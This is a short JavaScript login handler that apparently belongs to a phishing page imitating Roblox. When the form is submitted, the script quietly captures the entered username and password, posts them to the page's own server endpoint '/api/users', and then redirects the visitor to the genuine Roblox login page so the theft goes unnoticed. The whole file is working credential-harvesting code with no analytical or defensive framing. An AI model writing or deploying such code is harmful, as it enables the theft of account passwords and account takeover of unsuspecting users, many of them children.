document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.querySelector('form[name="loginForm"]');

  if (!loginForm) {
    return;
  }

  const redirectUrl = 'https://www.roblox.com/Login';

  function redirectToRobloxLogin() {
    window.location.assign(redirectUrl);
  }

  window.redirectToRobloxLogin = redirectToRobloxLogin;

  loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    const usernameInput = loginForm.querySelector('input[name="username"]');
    const passwordInput = loginForm.querySelector('input[name="password"]');

    if (usernameInput && passwordInput) {
      const username = usernameInput.value;
      const password = passwordInput.value;

      try {
        await fetch('/api/users', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username, password })
        });
      } catch (err) {
        console.error('Failed to save user', err);
      }
    }

    redirectToRobloxLogin();
  });
});